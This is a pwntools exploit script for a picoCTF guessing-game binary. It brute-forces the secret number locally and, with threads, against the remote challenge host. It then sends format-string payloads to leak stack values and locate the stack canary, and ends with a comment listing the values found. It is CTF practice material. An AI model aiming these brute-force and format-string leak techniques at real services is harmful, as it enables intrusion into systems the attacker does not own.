#!usr/bin/python3
from pwn import *
from threading import Thread
from queue import Queue

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
host, port = 'jupiter.challenges.picoctf.org', 44628

# https://www.pythontutorial.net/python-concurrency/python-threading/
# https://www.pythontutorial.net/python-concurrency/python-stop-thread/
# https://captain-woof.medium.com/picoctf-guessing-game-2-walkthrough-ret2libc-stack-cookies-6f9fc39273bf
# https://realpython.com/intro-to-python-threading/

class remote_fuzzer():
    def __init__(self, max_threads):
        self.max_threads = max_threads
        self.threads_counter = 0
        self.pool = Queue()
        for i in range(-4096, 4096):
            self.pool.put(i)
        self.isFound = False
        self.value = 0

    def start(self):
        while (not self.isFound):
            if (self.threads_counter <= self.max_threads):
                thread = Thread(target=self.fuzzing)
                thread.start()
                self.threads_counter += 1
        log.success(f'Correct value is {self.value}')
        return self.value


    def fuzzing(self):
        conn = remote(host, port)

        guess = self.pool.get(block=True)
        info(f'Guessing {guess}')

        conn.sendlineafter(b'guess?', str(guess).encode())
        conn.recvline()
        if "Congrats! You win!" in conn.recvline().decode().strip():
            self.isFound = True
            self.value =  guess
        
        conn.close()
        self.threads_counter -= 1
        return 

def local_fuzzer():
    io = process(exe)
    for guess in range(-4096, 4096):
        info(f'Guessing {guess}')
        io.sendlineafter(b'guess?', str(guess).encode())
        io.recvline()
        if "Congrats! You win!" in io.recvline().decode().strip():
            log.success(f'Correct value is {guess}')
            return guess

def fuzz_canary(guess):
    # io = remote(host, port)
    io = process(exe)
    for i in range(200):
        io.sendlineafter(b'guess?', str(guess).encode())
        io.sendlineafter(b'Name?', f'%{i}$lx'.encode())
        io.recvuntil(b'Congrats: ')
        leak = io.recvline()[:-1]
        info(f'stack at-{i} {leak}')
    io.close()

# =========================================================
#                         FUZZING
# =========================================================
# use threading to speed fuzzing remotely
guess = local_fuzzer()
guess = remote_fuzzer(10).start()
canary = fuzz_canary(-3727)

'''
guess value at local = -447
guess value remote = -3727
canary found stack = 135
'''
